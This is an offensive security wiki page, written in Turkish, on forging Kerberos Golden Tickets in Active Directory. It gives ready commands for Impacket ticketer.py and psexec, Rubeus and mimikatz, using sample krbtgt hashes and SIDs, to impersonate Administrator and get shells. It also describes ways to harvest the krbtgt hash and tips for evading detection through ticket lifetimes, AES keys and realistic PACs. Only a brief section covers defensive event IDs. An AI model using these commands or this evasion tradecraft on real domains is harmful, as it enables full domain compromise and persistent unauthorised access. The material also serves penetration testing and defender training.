# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Bir **Golden Ticket** saldırısı, **Active Directory (AD) krbtgt hesabının NTLM hash'inin** kullanılması yoluyla **herhangi bir kullanıcıyı taklit eden geçerli bir Ticket Granting Ticket (TGT) oluşturulmasından** oluşur. Bu teknik özellikle avantajlıdır; çünkü taklit edilen kullanıcı olarak domain içindeki **herhangi bir service veya machine'a erişim sağlar**. **krbtgt hesabının kimlik bilgilerinin hiçbir zaman otomatik olarak güncellenmediğini** unutmamak kritik önem taşır.<sup>[[1]](#references)</sup>

krbtgt hesabının **NTLM hash'ini elde etmek** için çeşitli yöntemler kullanılabilir. Hash, domain içindeki herhangi bir Domain Controller (DC) üzerinde bulunan **Local Security Authority Subsystem Service (LSASS) process'inden** veya **NT Directory Services (NTDS.dit) file'ından** çıkarılabilir. Ayrıca, bu NTLM hash'ini elde etmek için **DCsync attack gerçekleştirmek** de başka bir stratejidir. Bu işlem, Mimikatz içindeki **lsadump::dcsync module** veya Impacket tarafından sağlanan **secretsdump.py script** gibi tool'lar kullanılarak gerçekleştirilebilir. Bu işlemleri gerçekleştirmek için genellikle **domain admin privileges veya benzer düzeyde access gerektiğini** vurgulamak önemlidir.<sup>[[2]](#references)</sup>

NTLM hash'i bu amaç için uygulanabilir bir yöntem olsa da operasyonel güvenlik nedenleriyle **Advanced Encryption Standard (AES) Kerberos key'lerini (AES128 ve AES256) kullanarak ticket forge etmek** **şiddetle tavsiye edilir**. Bu, özellikle modern domain'lerde daha da önemlidir; çünkü **RC4 kullanımı aşamalı olarak kaldırılmaktadır** ve Kerberos telemetry'sinde çok daha belirgin şekilde öne çıkar.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Modern ticket crafting notları

Mümkün olduğunda, önce **LDAP ve SYSVOL'u sorgulayın** ve ardından ticket'ı manuel olarak uydurmak yerine gerçek domain policy ve user PAC değerlerini kullanarak forge edin:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap`, daha gerçekçi bir PAC oluşturmak için DC'den user, group, NetBIOS ve policy verilerini ister.
- `/printcmd`, alınan PAC alanlarını içeren bir offline command line yazdırır; bu, daha sonra LDAP'a tekrar dokunmadan aynı ticket'ı forge etmek istediğinizde kullanışlıdır.
- `/extendedupndns`, `samAccountName` ve account SID içeren yeni `UpnDns` PAC elementlerini ekler.
- `/oldpac`, yeni `Requestor` ve `Attributes` PAC buffer'larını kaldırır; bu seçenek varsayılan tradecraft için değil, çoğunlukla eski environment'larla compatibility testing yapmak için kullanışlıdır.

Linux'tan, güncel Impacket versions ayrıca yeni PAC structures eklemeyi ve gerçekçi bir validity period ayarlamayı destekler:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` **saat** cinsindendir. Varsayılan değer **10 yıl**dır; bu gürültülüdür.
- `-extra-pac`, daha yeni `UPN_DNS` PAC bilgilerini ekler.
- `-old-pac`, eski PAC düzenini zorunlu kılar.
- `-extra-sid`, PAC'nin ek SID'lere ihtiyaç duyduğu durumlarda kullanışlıdır (örneğin, [SID-History Injection](sid-history-injection.md) içinde ele alınan child-to-parent escalation senaryolarında).

**golden Ticket injected** olduktan **sonra**, paylaşılan dosyalara **(C$)** erişebilir ve servisleri ve WMI'yi çalıştırabilirsiniz; bu nedenle bir shell elde etmek için **psexec** veya **wmiexec** kullanabilirsiniz (winrm üzerinden shell elde edemiyor gibi görünüyorsunuz).

### Yaygın tespitleri atlatma

golden ticket'ı tespit etmenin en yaygın yolları, ağ üzerindeki **Kerberos trafiğini incelemektir**. Varsayılan olarak Mimikatz, **TGT'yi 10 yıl boyunca imzalar**; bu durum, onunla yapılan sonraki TGS isteklerinde anormal olarak öne çıkar.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Başlangıç offset'ini, süreyi ve maksimum yenileme sayısını (tümü dakika cinsinden) kontrol etmek için `/startoffset`, `/endin` ve `/renewmax` parametrelerini kullanın.
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Ne yazık ki TGT'nin ömrü 4769 olaylarında kaydedilmez; bu nedenle bu bilgiyi Windows olay günlüklerinde bulamazsınız. Ancak ilişkilendirebileceğiniz şey, öncesinde 4768 olmadan **4769 olaylarını görmektir**. **TGT olmadan TGS talep etmek mümkün değildir** ve bir TGT verildiğine dair kayıt yoksa, bunun offline olarak forge edildiği sonucuna varabiliriz.

**Daha yeni Windows sürümlerinde**, 4768 ve 4769 Olay Kimlikleri çok daha iyi **şifreleme türü telemetrisi** de sunar. `krbtgt`, istemciler ve hizmetlerin zaten AES anahtarlarına sahip olduğu bir domainde **RC4 (`0x17`)** kullanan sahte bir TGT/TGS'yi tespit etmek, birkaç yıl öncesine kıyasla çok daha kolaydır. Bu, **AES destekli Golden Tickets** kullanmayı ve domainin normal Kerberos politikasını mümkün olduğunca yakından eşleştirmeyi tercih etmek için bir başka nedendir.

Diğer bir OPSEC sorunu **PAC uyumluluğudur**. İmkansız grup üyeliklerine, yeni PAC buffer'larının eksikliğine veya LDAP ile eşleşmeyen hesap meta verilerine sahip ticket'lar, savunucular PAC içeriğini AD verileriyle doğruladığında daha kolay tespit edilir. Gerçekten bir DC tarafından verilmiş gibi görünen bir TGT'ye ihtiyacınız varsa şunları inceleyin:

{{#ref}}
diamond-ticket.md
{{#endref}}

Persistence için **ortamsal sınırlar** da vardır. `krbtgt` hesabı **2 parolalık bir geçmiş** tutar; bu nedenle sahte bir TGT önceki anahtarla imzalanmışsa, **ilk `krbtgt` sıfırlamasından** sonra da geçerli kalabilir. Savunucuların Golden Tickets'ı geçersiz kılmak için `krbtgt` hesabını **iki kez sıfırlamasının** ve sıfırlamalar arasında domainin maksimum ticket ömrü kadar beklemesinin nedeni budur.<sup>[[3]](#references)</sup>

Bu **tespit kontrolünü bypass etmek** için diamond tickets'ı inceleyin.

### Önleme

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Savunucuların uygulayabileceği diğer küçük yöntemler arasında, varsayılan domain administrator hesabı gibi hassas kullanıcılar için **4769 olaylarında alarm oluşturmak** ve normalde AES ticket'ları veren domainlerde **`krbtgt` için RC4 kullanımında alarm oluşturmak** bulunur.<sup>[[5]](#references)</sup>

## Referanslar

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
